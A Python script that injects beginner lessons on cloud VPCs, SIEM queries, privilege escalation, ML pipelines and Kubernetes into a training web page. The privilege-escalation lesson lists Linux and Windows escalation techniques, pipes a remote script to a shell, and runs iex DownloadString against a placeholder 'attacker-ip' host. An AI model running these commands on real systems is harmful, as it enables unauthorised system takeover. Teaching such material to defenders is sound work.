#!/usr/bin/env python3
"""Wave 31 – Cloud basics, SIEM/blue-team, privesc concepts, Kubernetes intro, ML pipelines."""
from pathlib import Path
from html.parser import HTMLParser

S_NET    = "<!-- BEGINNER31-NET v1 -->"
S_SEC    = "<!-- BEGINNER31-SEC v1 -->"
S_PENTEST= "<!-- BEGINNER31-PENTEST v1 -->"
S_AI     = "<!-- BEGINNER31-AI v1 -->"
S_OPS    = "<!-- BEGINNER31-OPS v1 -->"

A_NET    = "<!-- /domain-body net -->"
A_SEC    = "<!-- /domain-body sec -->"
A_PENTEST= "<!-- /domain-body pentest -->"
A_AI     = "<!-- /domain-body ai -->"
A_OPS    = "<!-- /domain-body ops -->"

# ══════════════════════════════════════════════════════════════════════════
# NET – Cloud networking basics (VPC, subnets, security groups)
# ══════════════════════════════════════════════════════════════════════════
C_NET = """
<!-- BEGINNER31-NET v1 -->
<!-- ── TOPIC: Cloud Networking – VPC Fundamentals ─────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-badge">Beginner</span>
    Cloud Networking – VPC, Subnets &amp; Security Groups
  </div>
  <div class="topic-body">

    <div class="concept-card">
      <div class="concept-label">Core Concept</div>
      <div class="concept-title">What Is a VPC?</div>
      <div class="concept-desc">
        A <strong>Virtual Private Cloud (VPC)</strong> is your own private
        network inside a cloud provider (AWS, Azure, GCP). Think of it as
        renting a section of a data centre and installing your own private
        network switches — except it's all software.<br><br>
        <strong>Key building blocks:</strong><br>
        &bull; <em>VPC</em> – the outer boundary; you choose the IP range
          (e.g. <code>10.0.0.0/16</code> = ~65 000 addresses).<br>
        &bull; <em>Subnet</em> – a slice of the VPC in one availability zone.
          Public subnets reach the internet; private subnets do not.<br>
        &bull; <em>Internet Gateway (IGW)</em> – the door between your VPC
          and the public internet.<br>
        &bull; <em>NAT Gateway</em> – lets private-subnet resources make
          <em>outbound</em> internet calls without being reachable from
          outside.<br>
        &bull; <em>Route Table</em> – rules that decide where packets go
          (like a router's routing table).<br>
        &bull; <em>Security Group</em> – a stateful firewall attached to an
          individual resource (VM, load balancer).
        <br><br>
        <em>"Assume" makes an ass out of you and me</em> — never assume a
        cloud resource is private just because it's in a VPC. Check security
        groups AND network ACLs; both must permit the traffic.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">AWS Example</div>
      <div class="concept-title">Building a VPC with AWS CLI</div>
      <div class="concept-desc">
        AWS CLI lets you build the entire network from the command line.
        This is the same thing the console does behind the scenes.
      </div>
      <div class="code-block">
<span class="com"># Create a VPC</span>
aws ec2 create-vpc --cidr-block <span class="num">10.0.0</span>.0/<span class="num">16</span> \
  --query Vpc.VpcId --output text
<span class="com"># Output: vpc-0abc1234def567890</span>

<span class="com"># Create a public subnet (AZ us-east-1a)</span>
aws ec2 create-subnet \
  --vpc-id vpc-0abc1234def567890 \
  --cidr-block <span class="num">10.0.1</span>.0/<span class="num">24</span> \
  --availability-zone us-east-<span class="num">1</span>a

<span class="com"># Create a private subnet</span>
aws ec2 create-subnet \
  --vpc-id vpc-0abc1234def567890 \
  --cidr-block <span class="num">10.0.2</span>.0/<span class="num">24</span> \
  --availability-zone us-east-<span class="num">1</span>a

<span class="com"># Attach an internet gateway</span>
aws ec2 create-internet-gateway --query InternetGateway.InternetGatewayId
aws ec2 attach-internet-gateway \
  --internet-gateway-id igw-0xyz \
  --vpc-id vpc-0abc1234def567890

<span class="com"># Security group: allow SSH from your IP only</span>
aws ec2 create-security-group \
  --group-name web-sg \
  --description <span class="str">"Web server SG"</span> \
  --vpc-id vpc-0abc1234def567890

aws ec2 authorize-security-group-ingress \
  --group-id sg-0xyz \
  --protocol tcp --port <span class="num">22</span> \
  --cidr <span class="num">203.0.113.5</span>/<span class="num">32</span>   <span class="com"># your IP only!</span>
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Best Practice</div>
      <div class="concept-title">The Shared Responsibility Model</div>
      <div class="concept-desc">
        Cloud providers operate a <em>Shared Responsibility Model</em>:
        the provider secures the infrastructure <em>of</em> the cloud;
        you secure everything <em>in</em> the cloud.<br><br>
        <strong>AWS/Azure/GCP handles:</strong> Physical data centres,
        hypervisor security, global network, managed service patches.<br><br>
        <strong>You handle:</strong> VM OS patches, security group rules,
        S3 bucket permissions, IAM roles, encryption of your data,
        application code security.<br><br>
        <em>"Not my circus, not my monkey"</em> only applies to the provider's
        layer. Misconfigured S3 buckets, open security groups, and leaked IAM
        keys are 100 % your responsibility. Most cloud breaches are
        misconfiguration, not a failure by the provider.
      </div>
    </div>

  </div>
</div>
"""

# ══════════════════════════════════════════════════════════════════════════
# SEC – SIEM & log analysis for blue team beginners
# ══════════════════════════════════════════════════════════════════════════
C_SEC = """
<!-- BEGINNER31-SEC v1 -->
<!-- ── TOPIC: SIEM & Log Analysis ─────────────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-badge">Beginner</span>
    SIEM &amp; Log Analysis – Blue Team Fundamentals
  </div>
  <div class="topic-body">

    <div class="concept-card">
      <div class="concept-label">Core Concept</div>
      <div class="concept-title">What Is a SIEM?</div>
      <div class="concept-desc">
        A <strong>SIEM (Security Information and Event Management)</strong>
        system collects logs from every device in your environment, stores
        them in one place, and helps you search for threats.
        Think of it as the security camera DVR for your entire network.<br><br>
        <strong>Common SIEMs:</strong> Splunk, IBM QRadar, Microsoft Sentinel,
        Elastic SIEM (ELK), Wazuh (open-source).<br><br>
        <strong>What gets sent to a SIEM:</strong><br>
        &bull; Windows Event Logs (logins, process creation, PowerShell activity).<br>
        &bull; Linux syslog / auditd events.<br>
        &bull; Firewall and router logs (connections, blocks).<br>
        &bull; DNS query logs (what domains hosts looked up).<br>
        &bull; Web proxy / email gateway logs.<br>
        &bull; Cloud trail logs (AWS CloudTrail, Azure Activity Log).<br><br>
        Logs are useless if you never look at them — the SIEM turns the
        firehose of logs into searchable, alertable data.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Key Windows Events</div>
      <div class="concept-title">Windows Event IDs Every Analyst Must Know</div>
      <div class="concept-desc">
        Windows Security log event IDs tell a story. Learn these cold:
      </div>
      <div class="code-block">
<span class="com">Event ID  Meaning</span>
<span class="num">4624</span>      Successful logon
<span class="num">4625</span>      Failed logon  (watch for bursts = brute force)
<span class="num">4634</span>      Logon session ended
<span class="num">4648</span>      Logon using explicit credentials (runas)
<span class="num">4672</span>      Special privileges assigned (admin logon)
<span class="num">4688</span>      New process created  (process execution)
<span class="num">4698</span>      Scheduled task created  (persistence!)
<span class="num">4720</span>      User account created
<span class="num">4732</span>      Member added to security-enabled local group
<span class="num">4768</span>      Kerberos TGT requested  (AD logon start)
<span class="num">4769</span>      Kerberos service ticket requested
<span class="num">4776</span>      NTLM credential validation  (legacy auth)
<span class="num">7045</span>      New service installed  (System log, common malware persistence)

<span class="com"># Query Windows Event Log via PowerShell</span>
Get-WinEvent -FilterHashtable @{
    LogName   = <span class="str">'Security'</span>
    Id        = <span class="num">4625</span>           <span class="com"># failed logons</span>
    StartTime = (Get-Date).AddHours(-<span class="num">1</span>)
} | Select TimeCreated, Message | Format-List
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Splunk / ELK</div>
      <div class="concept-title">Writing SIEM Queries</div>
      <div class="concept-desc">
        Every SIEM has a query language. Splunk uses SPL; Elastic uses KQL.
        Here are equivalent queries to find brute-force attempts:
      </div>
      <div class="code-block">
<span class="com">─── Splunk SPL ──────────────────────────────────────────────</span>
index=windows EventCode=<span class="num">4625</span>
| stats count by src_ip, user
| where count &gt; <span class="num">10</span>
| sort -count
| rename count <span class="kw">as</span> failed_attempts

<span class="com">─── Elastic KQL (Kibana) ─────────────────────────────────────</span>
event.code: <span class="str">"4625"</span> and event.outcome: <span class="str">"failure"</span>

<span class="com">─── Linux: grep for SSH brute force in auth.log ──────────────</span>
grep <span class="str">"Failed password"</span> /var/log/auth.log | \
  awk <span class="str">'{print $11}'</span> | sort | uniq -c | sort -rn | head -<span class="num">20</span>
<span class="com"># Shows top attacking IPs by failed SSH attempts</span>

<span class="com">─── Wazuh rule example (XML) ─────────────────────────────────</span>
&lt;rule id=<span class="str">"100100"</span> level=<span class="str">"10"</span> frequency=<span class="str">"5"</span> timeframe=<span class="str">"120"</span>&gt;
  &lt;if_matched_sid&gt;<span class="num">5503</span>&lt;/if_matched_sid&gt;  <span class="com">&lt;!-- SSH failed auth --&gt;</span>
  &lt;description&gt;SSH brute force attack&lt;/description&gt;
  &lt;group&gt;authentication_failures&lt;/group&gt;
&lt;/rule&gt;
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Alert Triage</div>
      <div class="concept-title">The Analyst's Triage Mindset</div>
      <div class="concept-desc">
        When a SIEM alert fires, resist the urge to panic or immediately
        escalate. Use a structured triage approach:<br><br>
        1. <strong>Understand the alert</strong> — what behaviour triggered it?<br>
        2. <strong>Check context</strong> — who is the user/host? Is this
           behaviour normal for them? (User Entity Behaviour Analytics).<br>
        3. <strong>Look before &amp; after</strong> — what happened in the 10
           minutes before and after the alert?<br>
        4. <strong>Corroborate</strong> — does another log source confirm it?<br>
        5. <strong>Classify</strong> — True Positive (real threat) /
           False Positive (benign) / Tuning Required (alert needs refinement).<br><br>
        <em>You can't make someone make the right choice, yet you can pick up
        the pieces afterwards</em> — if a developer opens port 22 to the
        world, the SIEM will catch the resulting attack. Document it,
        remediate, and use it to educate.
      </div>
    </div>

  </div>
</div>
"""

# ══════════════════════════════════════════════════════════════════════════
# PENTEST – Privilege escalation fundamentals
# ══════════════════════════════════════════════════════════════════════════
C_PENTEST = """
<!-- BEGINNER31-PENTEST v1 -->
<!-- ── TOPIC: Privilege Escalation Basics ─────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-badge">Beginner</span>
    Privilege Escalation – From Low User to Root/Admin
  </div>
  <div class="topic-body">

    <div class="concept-card">
      <div class="concept-label">Core Concept</div>
      <div class="concept-title">What Is Privilege Escalation?</div>
      <div class="concept-desc">
        After gaining initial access to a system, an attacker (or penetration
        tester) typically has limited permissions. <strong>Privilege
        escalation (privesc)</strong> is the process of gaining higher
        permissions — becoming <em>root</em> on Linux or
        <em>Administrator/SYSTEM</em> on Windows.<br><br>
        <strong>Two types:</strong><br>
        &bull; <em>Vertical privesc</em> — low user → admin/root (most common).<br>
        &bull; <em>Horizontal privesc</em> — user A accessing user B's data
          without being admin (e.g., IDOR vulnerabilities).<br><br>
        <strong>Why it matters for defenders:</strong> understanding how
        attackers escalate helps you close the gaps. Every misconfiguration
        covered here is something you can <em>find and fix</em> on your own
        systems <em>before</em> an attacker does.<br><br>
        <em>"Assume" makes an ass out of you and me</em> — never assume a
        low-privilege shell is harmless. Assume the attacker will look for
        every path to root.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Linux PrivEsc</div>
      <div class="concept-title">Common Linux Escalation Paths</div>
      <div class="concept-desc">
        These are the first things a pentester (and automated tools like
        <em>LinPEAS</em>) look for on a Linux box:
      </div>
      <div class="code-block">
<span class="com"># 1. Sudo misconfigurations — what can this user sudo?</span>
sudo -l
<span class="com"># If you see (ALL) NOPASSWD: /bin/vi → you can get a shell:</span>
<span class="com">#   sudo vi  → :!bash  (in vi command mode)</span>

<span class="com"># 2. SUID binaries — run as owner (root) regardless of who runs them</span>
find / -perm -4000 -type f <span class="num">2</span>&gt;/dev/null
<span class="com"># Dangerous SUID binaries: find, vim, python3, bash, cp</span>
<span class="com"># GTFOBins (gtfobins.github.io) lists how to abuse each one</span>

<span class="com"># 3. World-writable scripts run by root (cron jobs)</span>
<span class="com"># Find scripts called by root's crontab that any user can edit</span>
cat /etc/crontab
ls -la /etc/cron.d/
find /var/spool/cron /etc/cron* -type f <span class="num">2</span>&gt;/dev/null | xargs ls -la

<span class="com"># 4. Writable /etc/passwd (legacy systems)</span>
ls -la /etc/passwd   <span class="com"># should be -rw-r--r-- (644)</span>

<span class="com"># 5. Kernel exploits — check kernel version</span>
uname -r
<span class="com"># Search CVEs for that version (e.g. DirtyPipe CVE-2022-0847)</span>

<span class="com"># Automated enumeration (always use on authorised systems only)</span>
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Windows PrivEsc</div>
      <div class="concept-title">Common Windows Escalation Paths</div>
      <div class="concept-desc">
        Windows privesc is equally rich. These are the most-seen vectors
        in CTF competitions and real engagements:
      </div>
      <div class="code-block">
<span class="com"># 1. Unquoted service paths</span>
<span class="com"># If a service binary path has spaces and no quotes, Windows may</span>
<span class="com"># execute an attacker's binary instead.</span>
wmic service get name,pathname,startmode | findstr /i /v <span class="str">"c:\\windows\\"</span>
<span class="com"># Look for paths like: C:\Program Files\My App\service.exe</span>
<span class="com"># Windows tries: C:\Program.exe → C:\Program Files\My.exe → ...</span>

<span class="com"># 2. Weak service permissions (can modify service binary)</span>
accesschk.exe -uwcqv <span class="str">"Everyone"</span> * /accepteula
<span class="com"># If you can write to a service binary, replace it with your payload</span>

<span class="com"># 3. AlwaysInstallElevated (MSI runs as SYSTEM)</span>
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
<span class="com"># If both = 1 → msiexec /quiet /qn /i malicious.msi</span>

<span class="com"># 4. Stored credentials in registry / files</span>
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
findstr /si password *.txt *.xml *.config

<span class="com"># 5. Automated enumeration (authorised use only)</span>
<span class="com"># PowerShell: download and run WinPEAS</span>
iex (New-Object Net.WebClient).DownloadString(<span class="str">'http://attacker-ip/winpeas.ps1'</span>)
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Defence Takeaway</div>
      <div class="concept-title">Closing PrivEsc Gaps as a Defender</div>
      <div class="concept-desc">
        Run the same enumeration tools on <em>your own systems</em> to find
        weaknesses first:<br><br>
        &bull; Audit <code>sudo -l</code> output for all accounts; remove
          unnecessary <code>NOPASSWD</code> entries.<br>
        &bull; Remove SUID bit from binaries that don't need it:
          <code>chmod u-s /path/to/binary</code><br>
        &bull; Quote all service paths in Windows services.<br>
        &bull; Ensure service account binaries are not world-writable.<br>
        &bull; Disable <em>AlwaysInstallElevated</em> via GPO.<br>
        &bull; Rotate any plaintext credentials found in registry or files.<br>
        &bull; Keep kernels patched — most kernel exploits are patched
          within weeks of disclosure.
      </div>
    </div>

  </div>
</div>
"""

# ══════════════════════════════════════════════════════════════════════════
# AI – ML pipeline basics (data → train → evaluate → serve)
# ══════════════════════════════════════════════════════════════════════════
C_AI = """
<!-- BEGINNER31-AI v1 -->
<!-- ── TOPIC: ML Pipeline – Data to Production ───────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-badge">Beginner</span>
    ML Pipeline – From Raw Data to a Serving Model
  </div>
  <div class="topic-body">

    <div class="concept-card">
      <div class="concept-label">Core Concept</div>
      <div class="concept-title">What Is an ML Pipeline?</div>
      <div class="concept-desc">
        A <strong>machine learning pipeline</strong> is the end-to-end process
        of turning raw data into a model that answers real questions.
        There are six repeating stages:<br><br>
        1. <strong>Data collection</strong> — gather labelled examples.<br>
        2. <strong>Data cleaning</strong> — fix missing values, outliers,
           encoding errors.<br>
        3. <strong>Feature engineering</strong> — create input columns the
           model can use (e.g. convert date to day-of-week).<br>
        4. <strong>Training</strong> — feed data to an algorithm; it learns
           patterns.<br>
        5. <strong>Evaluation</strong> — measure accuracy on held-out test
           data the model has never seen.<br>
        6. <strong>Deployment</strong> — serve the model as an API so
           applications can call it.<br><br>
        The loop repeats: real-world feedback becomes new training data.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">scikit-learn</div>
      <div class="concept-title">A Complete Minimal Pipeline in Python</div>
      <div class="concept-desc">
        scikit-learn is the most beginner-friendly ML library. This example
        predicts whether a customer will churn (leave) based on usage data.
      </div>
      <div class="code-block">
<span class="kw">import</span> pandas <span class="kw">as</span> pd
<span class="kw">from</span> sklearn.model_selection <span class="kw">import</span> train_test_split
<span class="kw">from</span> sklearn.preprocessing  <span class="kw">import</span> StandardScaler
<span class="kw">from</span> sklearn.ensemble       <span class="kw">import</span> RandomForestClassifier
<span class="kw">from</span> sklearn.metrics        <span class="kw">import</span> classification_report

<span class="com"># 1. Load data</span>
df = pd.read_csv(<span class="str">"customers.csv"</span>)

<span class="com"># 2. Clean – drop rows with missing values in key columns</span>
df = df.dropna(subset=[<span class="str">"monthly_spend"</span>, <span class="str">"tenure_months"</span>, <span class="str">"churn"</span>])

<span class="com"># 3. Feature engineering</span>
X = df[[<span class="str">"monthly_spend"</span>, <span class="str">"tenure_months"</span>, <span class="str">"support_calls"</span>]]
y = df[<span class="str">"churn"</span>]                     <span class="com"># 1 = churned, 0 = stayed</span>

<span class="com"># 4. Split into train (80 %) and test (20 %)</span>
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=<span class="num">0.2</span>, random_state=<span class="num">42</span>
)

<span class="com"># 5. Scale features (tree models don't need this but good habit)</span>
scaler  = StandardScaler()
X_train = scaler.fit_transform(X_train)   <span class="com"># learn mean/std from train only</span>
X_test  = scaler.transform(X_test)        <span class="com"># apply same transform to test</span>

<span class="com"># 6. Train</span>
model = RandomForestClassifier(n_estimators=<span class="num">100</span>, random_state=<span class="num">42</span>)
model.fit(X_train, y_train)

<span class="com"># 7. Evaluate</span>
y_pred = model.predict(X_test)
<span class="fn">print</span>(classification_report(y_test, y_pred))
<span class="com"># Output: precision, recall, F1-score per class</span>
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Key Metrics</div>
      <div class="concept-title">Accuracy vs Precision vs Recall</div>
      <div class="concept-desc">
        <strong>Accuracy</strong> (correct / total) is misleading when one
        class is rare. If 99 % of emails are legit, a model that always
        says "legit" is 99 % accurate — and catches zero spam.<br><br>
        Use <em>precision</em> and <em>recall</em> for imbalanced problems:<br><br>
        <table class="ai-table">
          <tr><th>Metric</th><th>Question</th><th>Formula</th></tr>
          <tr><td>Precision</td><td>Of positives I predicted, how many are real?</td><td>TP / (TP + FP)</td></tr>
          <tr><td>Recall</td><td>Of actual positives, how many did I catch?</td><td>TP / (TP + FN)</td></tr>
          <tr><td>F1-score</td><td>Balance of precision &amp; recall</td><td>2 &times; P&times;R / (P+R)</td></tr>
        </table>
        <br>
        For security anomaly detection, high <em>recall</em> matters most —
        you'd rather have false alarms than miss a real attack.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Deployment</div>
      <div class="concept-title">Serving a Model as a REST API</div>
      <div class="concept-desc">
        Once a model is trained, save it and wrap it in a tiny web service
        so other applications can call it.
      </div>
      <div class="code-block">
<span class="kw">import</span> joblib, numpy <span class="kw">as</span> np
<span class="kw">from</span> flask <span class="kw">import</span> Flask, request, jsonify

<span class="com"># Save model + scaler after training</span>
joblib.dump(model,  <span class="str">"churn_model.pkl"</span>)
joblib.dump(scaler, <span class="str">"scaler.pkl"</span>)

<span class="com"># ── In the serving script ──</span>
app    = Flask(__name__)
_model  = joblib.load(<span class="str">"churn_model.pkl"</span>)
_scaler = joblib.load(<span class="str">"scaler.pkl"</span>)

@app.route(<span class="str">"/predict"</span>, methods=[<span class="str">"POST"</span>])
<span class="kw">def</span> <span class="fn">predict</span>():
    data   = request.get_json()
    X      = np.array([[data[<span class="str">"monthly_spend"</span>],
                        data[<span class="str">"tenure_months"</span>],
                        data[<span class="str">"support_calls"</span>]]])
    X_sc   = _scaler.transform(X)
    label  = <span class="fn">int</span>(_model.predict(X_sc)[<span class="num">0</span>])
    prob   = <span class="fn">float</span>(_model.predict_proba(X_sc)[<span class="num">0</span>, <span class="num">1</span>])
    <span class="kw">return</span> jsonify({<span class="str">"churn"</span>: label, <span class="str">"probability"</span>: <span class="fn">round</span>(prob, <span class="num">3</span>)})

<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
    app.run(port=<span class="num">5000</span>)

<span class="com"># Test it:</span>
<span class="com"># curl -X POST http://localhost:5000/predict \</span>
<span class="com">#   -H "Content-Type: application/json" \</span>
<span class="com">#   -d '{"monthly_spend": 45, "tenure_months": 6, "support_calls": 8}'</span>
      </div>
    </div>

  </div>
</div>
"""

# ══════════════════════════════════════════════════════════════════════════
# OPS – Kubernetes for beginners
# ══════════════════════════════════════════════════════════════════════════
C_OPS = """
<!-- BEGINNER31-OPS v1 -->
<!-- ── TOPIC: Kubernetes for Beginners ───────────────────────── -->
<div class="topic">
  <div class="topic-header">
    <span class="topic-badge">Beginner</span>
    Kubernetes – Container Orchestration Fundamentals
  </div>
  <div class="topic-body">

    <div class="concept-card">
      <div class="concept-label">Core Concept</div>
      <div class="concept-title">Why Kubernetes Exists</div>
      <div class="concept-desc">
        Docker runs one container on one machine. When you need to run
        hundreds of containers across dozens of machines, you need an
        <em>orchestrator</em>. <strong>Kubernetes (K8s)</strong> handles:<br><br>
        &bull; <strong>Scheduling</strong> — decides which machine runs which
          container.<br>
        &bull; <strong>Self-healing</strong> — restarts crashed containers
          automatically.<br>
        &bull; <strong>Scaling</strong> — adds/removes container replicas based
          on load.<br>
        &bull; <strong>Rolling updates</strong> — deploys new versions with zero
          downtime.<br>
        &bull; <strong>Service discovery</strong> — containers find each other
          by name, not IP.<br><br>
        <em>"Not my circus, not my monkey"</em> — the control plane (API
        server, etcd, scheduler) is managed for you on EKS/GKE/AKS. Your
        job is to manage your workloads, not the cluster control plane.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">Key Objects</div>
      <div class="concept-title">The K8s Object Hierarchy</div>
      <div class="concept-desc">
        Everything in Kubernetes is a YAML-defined <em>object</em>:
        <br><br>
        <strong>Pod</strong> — the smallest unit; one or more containers
        that share a network namespace. Pods are ephemeral — don't store
        state in them.<br><br>
        <strong>Deployment</strong> — manages a set of identical Pod replicas;
        handles rolling updates and rollbacks.<br><br>
        <strong>Service</strong> — a stable network endpoint (IP + DNS name)
        that load-balances across matching Pods.<br><br>
        <strong>ConfigMap / Secret</strong> — inject configuration or
        credentials into Pods without baking them into the image.<br><br>
        <strong>Namespace</strong> — a virtual cluster inside a cluster; used
        to separate teams or environments.
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">kubectl</div>
      <div class="concept-title">Essential kubectl Commands</div>
      <div class="concept-desc">
        <code>kubectl</code> is the CLI to interact with a Kubernetes cluster.
        Master these first.
      </div>
      <div class="code-block">
<span class="com"># Show cluster nodes</span>
kubectl get nodes

<span class="com"># Show all pods in a namespace</span>
kubectl get pods -n production

<span class="com"># Describe a pod (events, resource usage, errors)</span>
kubectl describe pod myapp-7d9f8c-xkz9p -n production

<span class="com"># View logs (last 100 lines)</span>
kubectl logs myapp-7d9f8c-xkz9p -n production --tail=100

<span class="com"># Follow logs in real time (like tail -f)</span>
kubectl logs -f deployment/myapp -n production

<span class="com"># Exec into a running container (interactive shell)</span>
kubectl exec -it myapp-7d9f8c-xkz9p -n production -- /bin/sh

<span class="com"># Apply a YAML manifest</span>
kubectl apply -f deployment.yaml

<span class="com"># Scale a deployment</span>
kubectl scale deployment myapp --replicas=<span class="num">5</span> -n production

<span class="com"># Roll back to the previous version</span>
kubectl rollout undo deployment/myapp -n production

<span class="com"># Check rollout status</span>
kubectl rollout status deployment/myapp -n production
      </div>
    </div>

    <div class="concept-card">
      <div class="concept-label">YAML Example</div>
      <div class="concept-title">A Minimal Deployment + Service</div>
      <div class="concept-desc">
        This is the smallest production-style Kubernetes manifest —
        a Deployment (runs the app) and a Service (exposes it):
      </div>
      <div class="code-block">
<span class="com"># deployment.yaml</span>
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: production
spec:
  replicas: <span class="num">3</span>
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: myapp
        image: myregistry/myapp:<span class="num">1.2</span>.<span class="num">3</span>
        ports:
        - containerPort: <span class="num">8080</span>
        resources:
          requests: { cpu: <span class="str">"100m"</span>, memory: <span class="str">"128Mi"</span> }
          limits:   { cpu: <span class="str">"500m"</span>, memory: <span class="str">"256Mi"</span> }
        readinessProbe:
          httpGet:   { path: /healthz, port: <span class="num">8080</span> }
          initialDelaySeconds: <span class="num">5</span>
---
<span class="com"># service.yaml (ClusterIP = internal only)</span>
apiVersion: v1
kind: Service
metadata:
  name: myapp
  namespace: production
spec:
  selector:
    app: myapp          <span class="com"># matches pods with label app=myapp</span>
  ports:
  - port: <span class="num">80</span>
    targetPort: <span class="num">8080</span>
      </div>
    </div>

  </div>
</div>
"""

# ══════════════════════════════════════════════════════════════════════════
# helpers
# ══════════════════════════════════════════════════════════════════════════
def inject(html, anchor, sentinel, content):
    if sentinel in html:
        return html, False
    pos = html.find(anchor)
    if pos == -1:
        return html, False
    return html[:pos] + content + html[pos:], True


class _Checker(HTMLParser):
    def __init__(self):
        super().__init__()
        self.stack = []
        self.stray = 0
        VOID = {"area","base","br","col","embed","hr","img","input",
                "link","meta","param","source","track","wbr"}
        self._void = VOID
    def handle_starttag(self, tag, attrs):
        if tag not in self._void:
            self.stack.append(tag)
    def handle_endtag(self, tag):
        if tag in self._void:
            return
        if self.stack and self.stack[-1] == tag:
            self.stack.pop()
        else:
            self.stray += 1


def validate(html):
    c = _Checker()
    c.feed(html)
    print(f"  Unclosed at EOF : {c.stack[-5:] if c.stack else 'NONE'}")
    print(f"  Stray end tags  : {c.stray}")


WAVES = [
    (A_NET,     S_NET,     C_NET),
    (A_SEC,     S_SEC,     C_SEC),
    (A_PENTEST, S_PENTEST, C_PENTEST),
    (A_AI,      S_AI,      C_AI),
    (A_OPS,     S_OPS,     C_OPS),
]


def main():
    path = Path("index.html")
    html = path.read_text(encoding="utf-8")
    changed = False
    for anchor, sentinel, content in WAVES:
        html, did = inject(html, anchor, sentinel, content)
        label = sentinel.split()[0].lstrip("<!-").strip()
        print(f"  {label}: {'INJECTED' if did else 'already present / anchor missing'}")
        changed = changed or did
    if changed:
        path.write_text(html, encoding="utf-8")
        print(f"\n  Written {len(html):,} bytes")
    else:
        print("\n  Nothing to do.")
    print("\n  HTML balance check:")
    validate(html)


if __name__ == "__main__":
    main()
